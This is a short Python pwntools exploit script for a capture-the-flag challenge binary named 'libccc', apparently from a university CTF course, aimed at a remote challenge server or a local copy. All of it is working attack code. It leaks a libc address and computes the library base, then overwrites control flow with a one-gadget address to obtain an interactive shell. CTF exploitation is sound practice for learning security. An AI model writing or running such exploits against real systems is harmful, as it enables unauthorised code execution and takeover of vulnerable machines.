#!/usr/bin/python
# -*- coding: UTF-8 -*-
from pwn import *

context.arch = 'amd64'

if args.REMOTE:
    p = remote('ctf.adl.tw', '11004')
else:
    p = process("./libccc", env={"LD_PRELOAD": "./libc.so.6"})

libc = ELF("./libc.so.6")

stdin_offset = 0x3eba00

libc.address = u64(p.recv(6) + '\0\0') - 0x3eba00

info(hex(libc.address))

payload = flat(
    cyclic(0x8),
    libc.address + 0x4f2c5
)

p.sendafter("Enter one string: ", cyclic(0x40))

p.sendafter("Enter another: ", payload)


p.interactive()
p.close()